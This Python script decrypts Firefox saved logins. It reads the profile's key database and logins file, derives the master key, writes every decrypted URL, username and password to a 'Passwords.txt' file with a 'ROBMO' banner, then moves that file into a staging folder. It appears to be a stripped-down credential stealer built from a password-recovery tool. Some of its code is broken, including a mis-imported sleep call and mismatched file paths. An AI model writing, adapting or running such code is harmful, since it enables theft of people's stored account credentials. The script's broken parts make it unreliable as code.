from struct import unpack
import sys
import shutil
import os
from binascii import hexlify, unhexlify 
import sqlite3
from base64 import b64decode
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
import hmac
from Crypto.Cipher import DES3, AES
from Crypto.Util.number import long_to_bytes
from Crypto.Util.Padding import unpad   
from optparse import OptionParser
import json
from pathlib import Path
import os,json,base64,sqlite3,win32crypt,shutil,click,re,random,hmac
from pyasn1.codec.der import decoder;from hashlib import sha1,pbkdf2_hmac
from struct import unpack;from binascii import hexlify,unhexlify
from rich.console import Console;from rich.table import Table;from rich.theme import Theme
from Crypto.Cipher import DES3,AES;from Crypto.Util.number import long_to_bytes;from Crypto.Util.Padding import unpad 
from time import sleep,localtime
if os.name=='nt':pass

def getShortLE(d, a):
   return unpack('<H',(d)[a:a+2])[0]

def getLongBE(d, a):
   return unpack('>L',(d)[a:a+4])[0]

asn1Types = { 0x30: 'SEQUENCE',  4:'OCTETSTRING', 6:'OBJECTIDENTIFIER', 2: 'INTEGER', 5:'NULL' }  

oidValues = { b'2a864886f70d010c050103': '1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC',
              b'2a864886f70d0307':'1.2.840.113549.3.7 des-ede3-cbc',
              b'2a864886f70d010101':'1.2.840.113549.1.1.1 pkcs-1',
              b'2a864886f70d01050d':'1.2.840.113549.1.5.13 pkcs5 pbes2', 
              b'2a864886f70d01050c':'1.2.840.113549.1.5.12 pkcs5 PBKDF2',
              b'2a864886f70d0209':'1.2.840.113549.2.9 hmacWithSHA256',
              b'60864801650304012a':'2.16.840.1.101.3.4.1.42 aes256-CBC'
              }   
              
def printASN1(d, l, rl):
   type = d[0]
   length = d[1]
   if length&0x80 > 0: 
     nByteLength = length&0x7f
     length = d[2]  
     skip=1
   else:
     skip=0    
   if type==0x30:
     seqLen = length
     readLen = 0
     while seqLen>0:
       len2 = printASN1(d[2+skip+readLen:], seqLen, rl+1)
       seqLen = seqLen - len2
       readLen = readLen + len2
     return length+2
   elif type==6: 
     oidVal = hexlify(d[2:2+length])
     if oidVal in oidValues:
        return length+2
   elif type==4: 
     return length+2
   elif type==5: 
     return length+2
   elif type==2: 
     return length+2
   else:
     if length==l-2:
       return length   

def readBsddb(name):   
  f = open(name,'rb')
  header = f.read(4*15)
  magic = getLongBE(header,0)
  if magic != 0x61561:
    sys.exit()
  version = getLongBE(header,4)
  if version !=2:
    sys.exit()
  pagesize = getLongBE(header,12)
  nkeys = getLongBE(header,0x38) 
  readkeys = 0
  page = 1
  nval = 0
  val = 1
  db1 = []
  while (readkeys < nkeys):
    f.seek(pagesize*page)
    offsets = f.read((nkeys+1)* 4 +2)
    offsetVals = []
    i=0
    nval = 0
    val = 1
    keys = 0
    while nval != val :
      keys +=1
      key = getShortLE(offsets,2+i)
      val = getShortLE(offsets,4+i)
      nval = getShortLE(offsets,8+i)
      offsetVals.append(key+ pagesize*page)
      offsetVals.append(val+ pagesize*page)  
      readkeys += 1
      i += 4
    offsetVals.append(pagesize*(page+1))
    valKey = sorted(offsetVals)  
    for i in range( keys*2 ):
      f.seek(valKey[i])
      data = f.read(valKey[i+1] - valKey[i])
      db1.append(data)
    page += 1
  f.close()
  db = {}

  for i in range( 0, len(db1), 2):
    db[ db1[i+1] ] = db1[ i ]
  if options.verbose>1:
    for i in db:
      print ('%s: %s' % ( repr(i), hexlify(db[i]) ))
  return db  

def decryptMoz3DES( globalSalt, masterPassword, entrySalt, encryptedData ):
  hp = sha1( globalSalt+masterPassword ).digest()
  pes = entrySalt + b'\x00'*(20-len(entrySalt))
  chp = sha1( hp+entrySalt ).digest()
  k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
  tk = hmac.new(chp, pes, sha1).digest()
  k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
  k = k1+k2
  iv = k[-8:]
  key = k[:24]
  if options.verbose>0:
    return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)

def decodeLoginData(data):
  asn1data = decoder.decode(b64decode(data)) 
  key_id = asn1data[0][0].asOctets()
  iv = asn1data[0][1][1].asOctets()
  ciphertext = asn1data[0][2].asOctets()
  return key_id, iv, ciphertext 
  
def getLoginData():
  logins = []
  sqlite_file = options.directory / 'signons.sqlite'
  json_file = options.directory / 'logins.json'
  if json_file.exists(): 
    loginf = open( json_file, 'r').read()
    jsonLogins = json.loads(loginf)
    if 'logins' not in jsonLogins:
      return []
    for row in jsonLogins['logins']:
      encUsername = row['encryptedUsername']
      encPassword = row['encryptedPassword']
      logins.append( (decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']) )
    return logins  
  elif sqlite_file.exists(): #firefox < 32
    conn = sqlite3.connect(sqlite_file)
    c = conn.cursor()
    c.execute("SELECT * FROM moz_logins;")
    for row in c:
      encUsername = row[6]
      encPassword = row[7]
      if options.verbose>1:
        print (row[1], encUsername, encPassword)
      logins.append( (decodeLoginData(encUsername), decodeLoginData(encPassword), row[1]) )
    return logins

CKA_ID = unhexlify('f8000000000000000000000000000001')

def extractSecretKey(masterPassword, keyData): 
  pwdCheck = keyData[b'password-check']
  entrySaltLen = pwdCheck[1]
  entrySalt = pwdCheck[3: 3+entrySaltLen]
  encryptedPasswd = pwdCheck[-16:]
  globalSalt = keyData[b'global-salt']
  if options.verbose>1:
    print ('globalSalt=%s' % hexlify(globalSalt))
  cleartextData = decryptMoz3DES( globalSalt, masterPassword, entrySalt, encryptedPasswd )
  if cleartextData != b'password-check\x02\x02':
    sys.exit()

  if CKA_ID not in keyData:
    return None
  privKeyEntry = keyData[ CKA_ID ]
  saltLen = privKeyEntry[1]
  nameLen = privKeyEntry[2]
  privKeyEntryASN1 = decoder.decode( privKeyEntry[3+saltLen+nameLen:] )
  data = privKeyEntry[3+saltLen+nameLen:]
  printASN1(data, len(data), 0)
  
  entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
  privKeyData = privKeyEntryASN1[0][1].asOctets()
  privKey = decryptMoz3DES( globalSalt, masterPassword, entrySalt, privKeyData )
  if options.verbose>0:
    print ('entrySalt=%s' % hexlify(entrySalt))
    print ('privKeyData=%s' % hexlify(privKeyData))
    print ('decrypted=%s' % hexlify(privKey))
  printASN1(privKey, len(privKey), 0)
  
  privKeyASN1 = decoder.decode( privKey )
  prKey= privKeyASN1[0][2].asOctets()
  print ('decoding %s' % hexlify(prKey))
  printASN1(prKey, len(prKey), 0)
  
  prKeyASN1 = decoder.decode( prKey )
  id = prKeyASN1[0][1]
  key = long_to_bytes( prKeyASN1[0][3] )
  if options.verbose>0:
    print ('key=%s' % ( hexlify(key) ))
  return key

def decryptPBE(decodedItem, masterPassword, globalSalt):
  pbeAlgo = str(decodedItem[0][0][0])
  if pbeAlgo == '1.2.840.113549.1.12.5.1.3': 
      
    entrySalt = decodedItem[0][0][1][0].asOctets()
    cipherT = decodedItem[0][1].asOctets()
    key = decryptMoz3DES( globalSalt, masterPassword, entrySalt, cipherT )
    return key[:24], pbeAlgo
  elif pbeAlgo == '1.2.840.113549.1.5.13': 
    
          
    assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
    assert str(decodedItem[0][0][1][0][1][3][0]) == '1.2.840.113549.2.9'
    assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'

    entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
    iterationCount = int(decodedItem[0][0][1][0][1][1])
    keyLength = int(decodedItem[0][0][1][0][1][2])
    assert keyLength == 32 

    k = sha1(globalSalt+masterPassword).digest()
    key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)    

    iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets() 
    cipherT = decodedItem[0][1].asOctets()
    clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
    
    return clearText, pbeAlgo

def getKey( masterPassword, directory ):  
  if (directory / 'key4.db').exists():
    conn = sqlite3.connect(directory / 'key4.db') 
    c = conn.cursor()
    c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
    row = c.fetchone()
    globalSalt = row[0] 
    item2 = row[1]
    printASN1(item2, len(item2), 0)
    decodedItem2 = decoder.decode( item2 ) 
    clearText, algo = decryptPBE( decodedItem2, masterPassword, globalSalt )
   
    if clearText == b'password-check\x02\x02': 
      c.execute("SELECT a11,a102 FROM nssPrivate;")
      for row in c:
        if row[0] != None:
            break
      a11 = row[0] 
      a102 = row[1] 
      if a102 == CKA_ID: 
        printASN1( a11, len(a11), 0)
        decoded_a11 = decoder.decode( a11 )
        clearText, algo = decryptPBE( decoded_a11, masterPassword, globalSalt )
        return clearText[:24], algo
      else:
        return None, None
  elif (directory / 'key3.db').exists():
    keyData = readBsddb(directory / 'key3.db')
    key = extractSecretKey(masterPassword, keyData)
    return key, '1.2.840.113549.1.12.5.1.3'
  else:
    return None, None


parser = OptionParser(usage="usage: %prog [options]")
parser.add_option("-v", "--verbose", type="int", dest="verbose", help="verbose level", default=0)
parser.add_option("-p", "--password", type="string", dest="masterPassword", help="masterPassword", default='')
parser.add_option("-d", "--dir", type="string", dest="directory", help="directory", default='')
(options, args) = parser.parse_args()
options.directory = Path(options.directory)

key, algo = getKey(  options.masterPassword.encode(), options.directory )
if key==None:
  sys.exit()
logins = getLoginData()

if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':  
  for i in logins:
    assert i[0][0] == CKA_ID
    iv = i[0][1]
    ciphertext = i[0][2] 
    iv = i[1][1]
    ciphertext = i[1][2] 
 
intro = """
╔════════════════════════════════════════════════╗

   ██████╗░░█████╗░██████╗░███╗░░░███╗░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗
   ██████╔╝██║░░██║██████╦╝██╔████╔██║██║░░██║
   ██╔══██╗██║░░██║██╔══██╗██║╚██╔╝██║██║░░██║
   ██║░░██║╚█████╔╝██████╦╝██║░╚═╝░██║╚█████╔╝
   ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░░░░╚═╝░╚════╝░
   
╚════════════════════════════════════════════════╝
""" 
if os.path.exists('Passwords.txt'):
    os.remove('Passwords.txt')
    
with open('Passwords.txt', 'w', encoding="utf-8") as f:
    f.write(intro + "\n")
    for i in logins:
        assert i[0][0] == CKA_ID
        f.write('𝐔𝐑𝐋: %s\n' % i[2])
        
        iv = i[0][1]
        ciphertext = i[0][2]
        f.write('𝐔𝐬𝐞𝐫: %s\n' % unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8).decode())
        iv = i[1][1]
        ciphertext = i[1][2]
        f.write('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: %s\n' % unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8).decode())
        f.write('\n')


download_folder = os.path.join(os.path.expanduser("~"), 'Downloads', 'ROBMO')

source_path = os.path.join(download_folder, 'Passwords.txt')

firefox_folder = os.path.join(os.path.expanduser("~"), '𝐔𝐬𝐞𝐫', '𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬', '𝐅𝐢𝐫𝐞𝐟𝐨𝐱')
destination_path = os.path.join(firefox_folder, 'Passwords.txt')

if not os.path.exists(firefox_folder):
    os.makedirs(firefox_folder)

time.sleep(10)

shutil.move(source_path, destination_path)

